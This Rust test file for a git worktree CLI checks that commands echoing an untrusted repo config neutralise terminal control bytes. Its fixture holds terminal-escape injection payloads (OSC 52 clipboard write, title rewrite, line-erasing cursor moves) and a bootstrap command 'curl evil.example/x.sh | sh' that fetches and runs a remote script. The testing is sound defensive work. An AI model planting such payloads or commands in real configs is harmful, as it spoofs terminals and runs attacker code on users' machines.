//! Issue #473: a `.gwm.toml` is data from an unvetted repo, and the
//! read-only commands that echo it do **not** go through the TOFU trust
//! gate — inspecting an unfamiliar repo before trusting it is meant to be
//! the safe thing to do. Echoing a config-supplied string verbatim hands
//! that file a terminal escape channel: an OSC 52 clipboard write, a window
//! title rewrite, cursor moves that erase the line above.
//!
//! These tests pin the invariant at the **sink** rather than at each call
//! site: whatever a command prints, no control byte from the config
//! survives to the terminal. Testing the sink is what makes the guarantee
//! survive a new check / row / field being added upstream.

mod common;

use assert_cmd::Command;
use common::init_repo;
use std::fs;
use std::path::Path;

/// A `.gwm.toml` carrying an ESC in every string field an ungated command
/// echoes.
///
/// The payload travels as TOML's own `\u001B` escape, not as a raw byte:
/// the parser **refuses** a literal control character inside a basic string,
/// so a raw byte would never reach a value in the first place (it produces a
/// parse error instead, which is what
/// [`a_config_parse_error_does_not_replay_the_files_control_bytes`] covers).
/// The escape decodes to a real ESC in the parsed value, which is precisely
/// what the echo sites then print.
const HOSTILE_CONFIG: &str = r#"
[worktree]
branch_pattern = "\u001B]0;PWNED{type}/#{issue}-{desc}"
base = "/tmp/gwm-hostile\u001B[2K"

[[branch_types]]
name = "feat"
description = "a feature\u001B]52;c;ZXZpbA==here"

[aliases]
"ok\u001B[31m" = "list --all"

[[bootstrap.copy]]
from = ".env\u001B[1A\u001B[2K"
to = ".env"

[[bootstrap.command]]
name = "setup\u001B[1A\u001B[2K"
run = "curl evil.example/x.sh | sh"

[[bootstrap.no_symlink]]
path = "node_modules\u001B[7m"
"#;

/// Every control byte that is not a line break. A terminal treats `\n` as
/// "next row", which is the one control character a multi-row report needs;
/// everything else is a command to the emulator.
fn control_bytes(s: &str) -> Vec<char> {
  s.chars().filter(|c| c.is_control() && *c != '\n').collect()
}

fn gwm_in(dir: &Path) -> Command {
  let mut cmd = Command::cargo_bin("gwm").unwrap();
  cmd.current_dir(dir);
  // Pin the layer under test to the repo file: a real user-level config on
  // the developer's machine would otherwise add rows this test did not write.
  cmd.env("GWM_NO_GLOBAL_CONFIG", "1");
  cmd
}

/// The ungated commands that read `.gwm.toml` and print part of it. Each one
/// was measured echoing a raw ESC before this fix.
const UNGATED_ECHO_COMMANDS: &[&[&str]] = &[
  &["config", "get", "worktree.branch_pattern"],
  &["config", "get", "worktree.base"],
  &["config", "list"],
  &["types"],
  &["aliases", "list"],
  &["doctor"],
  &["config", "validate"],
];

#[test]
fn no_ungated_command_replays_a_control_byte_from_the_repo_config() {
  let (dir, _repo) = init_repo();
  fs::write(dir.path().join(".gwm.toml"), HOSTILE_CONFIG).unwrap();

  for args in UNGATED_ECHO_COMMANDS {
    let out = gwm_in(dir.path()).args(*args).output().unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
      control_bytes(&stdout).is_empty(),
      "`gwm {}` replayed {:?} from .gwm.toml on stdout:\n{:?}",
      args.join(" "),
      control_bytes(&stdout),
      stdout
    );
    assert!(
      control_bytes(&stderr).is_empty(),
      "`gwm {}` replayed {:?} from .gwm.toml on stderr:\n{:?}",
      args.join(" "),
      control_bytes(&stderr),
      stderr
    );
  }
}

#[test]
fn a_neutralised_value_is_still_recognisable_in_the_output() {
  // Replace rather than strip (the idiom already used by
  // `tui::wt_tree::sanitize_name` and `naming::sanitise_for_terminal`): a
  // value the user cannot recognise is a value they cannot act on, and a
  // silently shortened one hides how much was removed.
  let (dir, _repo) = init_repo();
  fs::write(dir.path().join(".gwm.toml"), HOSTILE_CONFIG).unwrap();

  let out = gwm_in(dir.path())
    .args(["config", "get", "worktree.branch_pattern"])
    .output()
    .unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    stdout.contains("]0;PWNED{type}/#{issue}-{desc}"),
    "the pattern should stay readable minus its control bytes, got {:?}",
    stdout
  );
  assert!(
    stdout.contains('?'),
    "the neutralised byte should leave a visible placeholder, got {:?}",
    stdout
  );
}

#[test]
fn config_list_keeps_escaping_string_values() {
  // `format_list_value` renders strings with `{:?}`, and Rust's `Debug` for
  // `str` escapes control characters — so the *values* of `gwm config list`
  // were never the hole (the keys were). That protection is incidental to a
  // formatting choice, so pin it: "simplifying" `{:?}` to `{}` would reopen
  // the channel silently.
  let (dir, _repo) = init_repo();
  fs::write(dir.path().join(".gwm.toml"), HOSTILE_CONFIG).unwrap();

  let out = gwm_in(dir.path()).args(["config", "list"]).output().unwrap();
  let stdout = String::from_utf8_lossy(&out.stdout);
  assert!(
    stdout.contains(r"\u{1b}"),
    "string values should still come out Debug-escaped, got {:?}",
    stdout
  );
}

#[test]
fn a_config_parse_error_does_not_replay_the_files_control_bytes() {
  // A raw ESC byte cannot live inside a TOML basic string, so it never
  // becomes a *value* — but `toml`'s parse error quotes the offending source
  // line verbatim, which puts the byte on stderr anyway. That path is
  // reachable from EVERY command that loads config, not only the ones that
  // echo a value, so it is the widest leg of #473.
  let (dir, _repo) = init_repo();
  fs::write(
    dir.path().join(".gwm.toml"),
    "[worktree]\nbranch_pattern = \"\u{1b}]0;PWNED\"\n",
  )
  .unwrap();

  let out = gwm_in(dir.path()).args(["config", "list"]).output().unwrap();
  let stderr = String::from_utf8_lossy(&out.stderr);
  assert!(
    control_bytes(&stderr).is_empty(),
    "the parse error replayed {:?} from the source line:\n{:?}",
    control_bytes(&stderr),
    stderr
  );
  // The diagnostic still has to be a diagnostic: line breaks are what make
  // `toml`'s caret-under-the-column snippet readable, so they survive.
  assert!(
    stderr.lines().count() > 1,
    "the snippet should keep its line breaks, got {:?}",
    stderr
  );
}

#[test]
fn the_pre_trust_bootstrap_summary_neutralises_control_bytes() {
  // The highest-severity site: this summary is printed immediately above
  // `Trust this .gwm.toml? [y/N/show]:`, from a file the user has explicitly
  // not trusted yet. `\u001B[1A\u001B[2K` moves the cursor up one row and
  // erases it, so an unsanitised `[[bootstrap.command]]` name can delete the
  // `run` line that the summary exists to reveal.
  let cfg: gwm::config::Config = toml::from_str(HOSTILE_CONFIG).unwrap();
  let lines = gwm::cli::bootstrap_summary_lines(&cfg);

  let joined = lines.join("\n");
  assert!(
    control_bytes(&joined).is_empty(),
    "the pre-trust summary replayed {:?}:\n{:?}",
    control_bytes(&joined),
    joined
  );
  // The command the user is being asked to authorise still has to be legible.
  assert!(
    joined.contains("curl evil.example/x.sh | sh"),
    "the summary must still name the command, got {:?}",
    joined
  );
  assert!(
    joined.contains("node_modules"),
    "the summary must still name the no-symlink target, got {:?}",
    joined
  );
}
